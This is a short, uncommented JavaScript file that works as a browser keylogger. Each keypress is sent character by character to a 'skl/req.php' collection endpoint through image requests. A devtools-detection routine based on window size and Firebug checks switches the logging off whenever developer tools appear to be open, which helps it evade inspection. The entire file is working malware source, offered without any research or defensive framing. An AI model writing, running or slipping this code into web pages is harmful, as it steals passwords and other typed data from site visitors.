const URL = 'http://localhost/skl/req.php?c=';

const record = ({keyCode, charCode, which}) => new Image().src = `${URL}${encodeURIComponent(String.fromCharCode(keyCode || charCode || which))}`;
window.addEventListener('devtoolschange', ({detail}) => detail.open ? document.removeEventListener('keypress', record) : document.addEventListener('keypress', record));

(function () {
	'use strict';
	let devToolsOpened = false;
	let threshold = 160;
	const emitEvent = state => window.dispatchEvent(new CustomEvent('devtoolschange', {detail: {open: state}}));
	
	setInterval(() => {
		let widthThreshold = window.outerWidth - window.innerWidth > threshold;
		let heightThreshold = window.outerHeight - window.innerHeight > threshold;

		if(!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
			!devToolsOpened && emitEvent(true);
			devToolsOpened = true;
		} else {
			devToolsOpened && emitEvent(false);
			devToolsOpened = false;
		}
	}, 500);

	if(typeof module !== 'undefined' && module.exports) {
		module.exports = devToolsOpened;
	} else {
		window.devToolsOpened = devToolsOpened;
	}
})();